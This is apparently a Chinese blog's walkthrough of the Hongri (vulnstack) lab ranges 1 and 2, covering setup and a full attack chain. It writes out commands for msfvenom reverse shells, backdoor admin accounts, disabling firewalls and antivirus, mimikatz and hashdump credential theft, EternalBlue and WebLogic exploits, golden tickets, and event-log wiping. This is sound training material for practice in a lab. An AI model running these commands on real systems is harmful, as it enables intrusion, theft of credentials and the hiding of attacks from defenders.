<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110212036.png"></p>
<p>将生成的可执行文件通过蚁剑上传到WWW目录下</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110513637.png"></p>
<p>右键打开终端，执行上传上去的shell.exe</p>
<p>成功上线cs</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110603730.png"></p>
<h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><p>方便操作，我们把回连间隔改为0使得输入的命令立刻执行</p>
<p>（实战不建议这样，容易被办）</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717110954825.png"></p>
<p>右键进入beacon，上线cs第一件事把防火墙关了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717111231214.png"></p>
<p><strong>补充：也可以远程登陆关闭防火墙</strong></p>
<p>尝试远程登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net user rev1ve sz@2019 /add               #添加账户密码</span><br><span class="line">shell net localgroup administrators rev1ve /add  #添加为管理员权限</span><br><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f </span><br><span class="line"># 开启3389端口</span><br></pre></td></tr></table></figure>

<p>成功添加管理员用户</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717133735976.png"></p>
<p>然后在攻击机执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.80.128:3389</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717135102643.png"></p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>关闭防火墙后，右键<code>执行 -&gt; 提权</code>选择我们刚刚创建的监听器</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717111348584.png"></p>
<p>执行exp，过一会拿到SYSTEM权限（把回连间隔也改为0）</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112013366.png"></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>尝试cve-2019-0803提权 <a href="https://k8gege.org/p/fa25cc9b.html">exp链接</a></p>
<p>将下载的cve-2019-0803.exe上传到WWW目录下，执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell cve-2019-0803.exe cmd &quot;start shell.exe&quot;</span><br></pre></td></tr></table></figure>

<p>相当于再启动shell.exe木马文件，过一会拿到SYSTEM权限</p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><h5 id="查看网络适配器"><a href="#查看网络适配器" class="headerlink" title="查看网络适配器"></a>查看网络适配器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112603302.png"></p>
<p>不难发现除了我们访问ip所在网段外，还存在内网<code>192.168.52.0/24</code>的网段</p>
<h5 id="查看本地用户信息"><a href="#查看本地用户信息" class="headerlink" title="查看本地用户信息"></a>查看本地用户信息</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717112931140.png"></p>
<h5 id="查看本地管理员组"><a href="#查看本地管理员组" class="headerlink" title="查看本地管理员组"></a>查看本地管理员组</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717113124605.png"></p>
<h4 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h4><h5 id="判断是否存在域环境"><a href="#判断是否存在域环境" class="headerlink" title="判断是否存在域环境"></a>判断是否存在域环境</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net config Workstation</span><br></pre></td></tr></table></figure>

<p>可以知道存在GOD域环境，域名为god.org</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717120313607.png"></p>
<h5 id="查看域列表"><a href="#查看域列表" class="headerlink" title="查看域列表"></a>查看域列表</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717175935391.png"></p>
<h5 id="查看域用户信息"><a href="#查看域用户信息" class="headerlink" title="查看域用户信息"></a>查看域用户信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell wmic useraccount get Caption,Domain,Description</span><br></pre></td></tr></table></figure>

<p>我们目前拿到的shell就是位于STU1</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717123542185.png"></p>
<h5 id="查看主域控制器"><a href="#查看主域控制器" class="headerlink" title="查看主域控制器"></a>查看主域控制器</h5><p>通过查询时间服务器来找到主域控制器名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net time /domain</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717122011356.png"></p>
<h5 id="定位主域控制器"><a href="#定位主域控制器" class="headerlink" title="定位主域控制器"></a>定位主域控制器</h5><p>拿到主域控制器名称后，执行以下命令定位目标主机在内网的IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell ping owa.god.org</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717122122602.png"></p>
<h4 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><h5 id="基于ICMP发现存活主机"><a href="#基于ICMP发现存活主机" class="headerlink" title="基于ICMP发现存活主机"></a>基于ICMP发现存活主机</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717123253998.png"></p>
<p>也可以使用cs右键<code>目标 -&gt; 端口扫描</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717124846523.png"></p>
<p>得到存活主机名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.143       #我们getshell机子的内网ip</span><br><span class="line">192.168.52.141       </span><br><span class="line">192.168.52.138       #主域控制器的内网ip</span><br></pre></td></tr></table></figure>

<h5 id="使用fscan扫描内网存活主机"><a href="#使用fscan扫描内网存活主机" class="headerlink" title="使用fscan扫描内网存活主机"></a>使用fscan扫描内网存活主机</h5><p>由于目标网段是内网，我们需要搭建一个一级网络代理</p>
<p>这里就不赘述</p>
<h4 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h4><h5 id="抓取-Hash"><a href="#抓取-Hash" class="headerlink" title="抓取 Hash"></a>抓取 Hash</h5><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717144635784.png"></p>
<h5 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h5><p>右键选择<code>执行 -&gt; run mimikatz</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717125753858.png"></p>
<h4 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h4><p>我们目前拿到的是内网ip为192.168.52.143的控制权</p>
<p>不过这台机子并不在GOD域内，我们尝试切换目标为ip是192.168.52.138的域控</p>
<p>由于刚刚扫描发现445端口开放</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142743288.png"></p>
<p>那么先创建SMB监听器</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142829861.png"></p>
<p>然后在左上角点击显示目标</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717135529818.png"></p>
<p>右键选择<code>jump -&gt; psexec</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717142553417.png"></p>
<p>然后选择我们刚刚创建的SMB监听器，对端连接的隧道选择system权限的</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717143031547.png"></p>
<p>不清楚这里为什么失败，搁置了很久</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717143334195.png"></p>
<p>后面参考别人的wp，想到应该是这里psexec对应的密码我们是修改过的，我们将域控原始密码<code>hongrisec@2019</code>改为我们后面的新密码就行了</p>
<p>横向移动后，养成关闭防火墙习惯</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717185353040.png"></p>
<p>成功进入域控，拿到最高权限</p>
<h3 id="权限维持-黄金票据"><a href="#权限维持-黄金票据" class="headerlink" title="权限维持-黄金票据"></a>权限维持-黄金票据</h3><p>这里需要再抓取一次hash和明文密码</p>
<p><strong>抓取hash</strong></p>
<p>右键选择<code>执行 -&gt; 转储hash</code></p>
<p>记住Krbtgt的hash值<code>58e91a5ac358d86513ab224312314061</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717185801850.png"></p>
<p><strong>抓取明文密码</strong></p>
<p>右键选择<code>执行 -&gt; run mimikatz</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190216486.png"></p>
<p> 把SID，域名和hash复制下来</p>
<p>右键选择<code>执行 -&gt; 黄金票据</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190625098.png"></p>
<p>填进对应数据</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190807401.png"></p>
<p>出现下图视为成功</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240717190914990.png"></p>
<h3 id="消除痕迹"><a href="#消除痕迹" class="headerlink" title="消除痕迹"></a>消除痕迹</h3><p> 在渗透过程中，痕迹清除非常非常重要，不清除容易被防守方溯源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell wevtutil cl security                #清理安全日志</span><br><span class="line">shell wevtutil cl system                  #清理系统日志</span><br><span class="line">shell wevtutil cl application             #清理应用程序日志</span><br><span class="line">shell wevtutil cl &quot;windows powershell&quot;    #清除power shell日志</span><br><span class="line">shell wevtutil cl Setup                   #清除（cl）事件日志中的 &quot;Setup&quot; 事件。</span><br></pre></td></tr></table></figure>

<p>到这里整个打靶流程就结束了</p>
<hr>
<h2 id="打法二"><a href="#打法二" class="headerlink" title="打法二"></a>打法二</h2><h3 id="联动蚁剑上线msf"><a href="#联动蚁剑上线msf" class="headerlink" title="联动蚁剑上线msf"></a>联动蚁剑上线msf</h3><p>我们先生成msf的木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.80.10 LPORT=1028 -f exe &gt; exp.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113239163.png"></p>
<p>开启msf监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.80.10</span><br><span class="line">set lport 1028</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>通过蚁剑上传木马文件并执行，拿到meterpreter会话</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113531008.png"></p>
<p>执行shell命令，输入<code>chcp 65001</code>解决中文乱码问题</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718113839978.png"></p>
<p>上线msf第一件事关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718120946317.png"></p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>我们可以知道目前是administrator管理员权限</p>
<p>尝试窃取SYSTEM权限令牌，在meterpreter会话依次执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load incognito                                   #加载incognito模块</span><br><span class="line">list_tokens -u                                   #列出主机上所有令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;          #窃取NT AUTHORITY\SYSTEM账户的令牌</span><br><span class="line">steal_token &lt;PID&gt;                                #从指定进程中窃取令牌</span><br></pre></td></tr></table></figure>

<p>成功拿到最高权限</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718120659776.png"></p>
<h3 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="内网信息搜集-1"><a href="#内网信息搜集-1" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><p>和打法一相同不再赘述</p>
<h4 id="域内信息搜集-1"><a href="#域内信息搜集-1" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h4><p>和打法一相同不再赘述</p>
<h4 id="探测内网存活主机-1"><a href="#探测内网存活主机-1" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><p>由于我们拿到shell了，利用后渗透阶段的基于arp协议探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718183923147.png"></p>
<h4 id="用户凭据收集-1"><a href="#用户凭据收集-1" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h4><h5 id="抓取Hash"><a href="#抓取Hash" class="headerlink" title="抓取Hash"></a>抓取Hash</h5><p>可以使用模块smart hashdump</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718184600701.png"></p>
<p>也可以执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718185518980.png"></p>
<h5 id="抓取明文密码-1"><a href="#抓取明文密码-1" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h5><p>前提条件：</p>
<ul>
<li>SYSTEM权限</li>
<li>meterpreter进程迁移到一个64位程序的进程中</li>
</ul>
<p>使用msf中的kiwi模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi         #加载kiwi模块</span><br><span class="line">help kiwi         #查看kiwi模块的使用</span><br></pre></td></tr></table></figure>

<p>我们现在执行<code>creds_all</code>不行，原因在于我们的meterpreter进程在86位进程中</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192049466.png"></p>
<p>我们可以选择迁移PID为516的lsass.exe进程</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192231428.png"></p>
<p>获取明文密码</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718192345127.png"></p>
<h4 id="内网横向移动-1"><a href="#内网横向移动-1" class="headerlink" title="内网横向移动"></a>内网横向移动</h4><p>我们前面知道还存在<code>192.168.52.0/24</code>网段，借助MSF 的 autoroute 模块去访问内网网段</p>
<p><strong>静态路由配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute  </span><br><span class="line">#添加目标内网路由</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD</span><br></pre></td></tr></table></figure>

<p>可以看到已经存在该内网网段，就不用再添加了</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718195213356.png"></p>
<p>尝试探测域控主机的445端口是否开放</p>
<p>使用<code>auxiliary/scanner/portscan/tcp</code>模块</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718195748044.png"></p>
<p>开启445端口的话，尝试使用永恒之蓝漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718202222895.png"></p>
<p>成功拿到域控的最高权限</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20240718202313891.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>解决小皮停止工作：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_57401160/article/details/139505815">https://blog.csdn.net/weixin_57401160/article/details/139505815</a></li>
</ul>
<p>靶场wp：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_52849046/article/details/139163010">https://blog.csdn.net/qq_52849046/article/details/139163010</a></li>
<li><a href="https://blog.csdn.net/qq_43531669/article/details/129945347">https://blog.csdn.net/qq_43531669/article/details/129945347</a></li>
</ul>
<p>msf抓取明文密码：</p>
<ul>
<li><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485520&idx=1&sn=afe7ab1dd663bf8dcc9811c840f33614&chksm=eaad886dddda017b5ca9f42ac926ec8abdb42e958561924144f79aad5969c7310bf059e9ba03&scene=21%23wechat_redirect&source=article&objectId=1937042">https://cloud.tencent.com/developer/tools/blog-entry?target=http%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI2NDQyNzg1OA%3D%3D%26mid%3D2247485520%26idx%3D1%26sn%3Dafe7ab1dd663bf8dcc9811c840f33614%26chksm%3Deaad886dddda017b5ca9f42ac926ec8abdb42e958561924144f79aad5969c7310bf059e9ba03%26scene%3D21%23wechat_redirect&amp;source=article&amp;objectId=1937042</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>域渗透</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场2</title>
    <url>/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2.html</url>
    <content><![CDATA[<p>WebLogic wls9-async 组件命令执行漏洞</p>
<span id="more"></span>

<h1 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="红日靶场2"></a>红日靶场2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>环境下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
</blockquote>
<h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/1.png"></p>
<h3 id="配置网段"><a href="#配置网段" class="headerlink" title="配置网段"></a>配置网段</h3><p>打开vm找到左上角<code>编辑—&gt;虚拟网络编辑器</code>添加一段虚拟网络VMnet7，设置为仅主机s</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802113234358.png"></p>
<h3 id="配置DC域控"><a href="#配置DC域控" class="headerlink" title="配置DC域控"></a>配置DC域控</h3><p>点击<code>.vmx</code>文件加载虚拟机配置，然后点击<code>升级此虚拟机</code>将兼容性改成16.2</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802165927302.png"></p>
<p>点击<code>更改此虚拟机</code>即可</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170036075.png"></p>
<p>剩下两台机子都需要进行上述操作就不再赘述</p>
<p>修改网络适配器为<code>VMnet7</code>网卡</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170614526.png"></p>
<h3 id="配置PC"><a href="#配置PC" class="headerlink" title="配置PC"></a>配置PC</h3><p>PC机相当于网关服务器，所以需要两张网卡，一个用来向外网提供web服务，一个是通向内网</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802170941170.png"></p>
<p>由于作者设置的NET网段是<code>192.168.111.0/24</code>，而我们的NET网卡是<code>192.168.132.0/24</code>，所以需要修改一下</p>
<p>我们使用密码<code>1qaz@WSX</code>登录PC机，打开<code>控制面板 =&gt; 网络和 Internet =&gt; 网络和共享中心</code>。点击左侧更改网络适配器，选择本地连接使用<code>administrator:1qaz@WSX</code>查看属性，修改下ip地址以及默认网关即可</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802172352743.png"></p>
<p>查看下ipconfig，修改成功</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802172711365.png"></p>
<h3 id="配置WEB"><a href="#配置WEB" class="headerlink" title="配置WEB"></a>配置WEB</h3><p>需要两块网卡，相当于网关服务器</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802171336747.png"></p>
<p>和PC机一样，我们也需要登录修改下网络适配器，不过这里需要将快照先回退到V1.3的时候</p>
<p>使用<code>1qaz@WSX</code>登录后和配置PC机一样的步骤，修改ip地址和默认网关</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802174544968.png"></p>
<p>查看ipconfig，修改成功</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175140210.png"></p>
<p>然后开启下web服务，访问<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code></p>
<p>遇到无权限访问就使用<code>administrator:1qaz@WSX</code>登录，然后以管理员权限执行<code>startWebLogic</code>文件</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175801277.png"></p>
<p>启动服务成功</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240802175932605.png"></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用fscan扫描下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fscan -h 192.168.132.80 -no</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803183657415.png"></p>
<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>可以发现7001端口扫出来有weblogic中间件的<code>CVE-2019-2725</code>，这里试了半天</p>
<blockquote>
<p>注：由于是java反序列化的漏洞，所以网上不同exp对应的jdk版本可能不同，在使用时需要注意下</p>
</blockquote>
<p>我们打开metasploit搜索一下<code>cve-2019-2725</code></p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803203604217.png"></p>
<p>依次执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set RHOSTS 192.168.132.80</span><br><span class="line">set LHOST 192.168.132.133</span><br><span class="line">set target 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>成功拿到meterpreter会话</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803184254276.png"></p>
<p>执行shell命令，输入<code>chcp 65001</code>解决中文乱码问题</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105027645.png"></p>
<p>养成好习惯，上线msf第一件事在meterpreter会话中关闭杀毒软件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run killav</span><br></pre></td></tr></table></figure>

<p>还有关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803193113909.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试窃取SYSTEM权限令牌，在meterpreter会话依次执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load incognito                                   #加载incognito模块</span><br><span class="line">list_tokens -u                                   #列出主机上所有令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;          #窃取NT AUTHORITY\SYSTEM账户的令牌</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105257213.png"></p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3><h4 id="查看网络适配器"><a href="#查看网络适配器" class="headerlink" title="查看网络适配器"></a>查看网络适配器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p>可以知道还存在<code>10.10.10.0/24</code>内网网段</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803105602146.png"></p>
<h4 id="查看本地用户信息"><a href="#查看本地用户信息" class="headerlink" title="查看本地用户信息"></a>查看本地用户信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p>存在三个用户</p>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803112728035.png"></p>
<h4 id="查看本地管理员组"><a href="#查看本地管理员组" class="headerlink" title="查看本地管理员组"></a>查看本地管理员组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803185847537.png"></p>
<h3 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h3><h4 id="查看是否存在域环境"><a href="#查看是否存在域环境" class="headerlink" title="查看是否存在域环境"></a>查看是否存在域环境</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config Workstation   </span><br></pre></td></tr></table></figure>

<blockquote>
<p>坑点：在没有提权前是可以执行找到名为<code>DE1AY</code>的域环境，但是后面提升到SYSTEM权限执行不了此命令</p>
</blockquote>
<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803112753809.png"></p>
<h4 id="查看域用户信息"><a href="#查看域用户信息" class="headerlink" title="查看域用户信息"></a>查看域用户信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803190059469.png"></p>
<h4 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /Domain</span><br></pre></td></tr></table></figure>

<p>查看域管理员组，得到管理员用户为<code>Administrator</code></p>
